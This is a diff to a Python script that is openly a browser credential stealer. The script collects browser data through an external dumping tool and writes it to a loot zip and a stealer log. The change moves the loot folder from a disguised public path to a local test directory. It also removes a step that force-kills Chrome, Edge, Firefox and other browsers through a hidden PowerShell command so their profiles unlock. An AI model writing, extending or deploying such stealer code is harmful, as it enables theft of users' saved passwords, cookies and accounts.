@@ -8,7 +8,7 @@ import os, sys, json, re, shutil, subprocess, zipfile, tempfile, logging, dateti
 import winreg, time
 
 # ============ CONFIG ============
-LOOT_DIR = pathlib.Path(r"C:\Users\Public\Chrome")
+LOOT_DIR = pathlib.Path(r"C:\projects\chimera-local-test")
 LOOT_ZIP = LOOT_DIR / "stealer_loot.zip"
 LOG_FILE = LOOT_DIR / "stealer.log"
 
@@ -70,12 +70,6 @@ def dump_all_browsers():
     if not HBD_EXE.exists():
         log.error(f"HBD exe not found: {HBD_EXE}")
         sys.exit(1)
-
-    # Kill browsers via PowerShell Stop-Process (works in non-interactive/service context)
-    browser_procs = ["chrome","msedge","brave","firefox","opera","vivaldi"]
-    ps_kill = "Stop-Process -Name @('{}') -Force -ErrorAction SilentlyContinue".format("','".join(browser_procs))
-    run_cmd(["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", ps_kill], timeout=10)
-    time.sleep(3)  # Wait for browsers to fully release profile lock
 
     if BROWSER_DUMP_DIR.exists():
         shutil.rmtree(BROWSER_DUMP_DIR, ignore_errors=True)
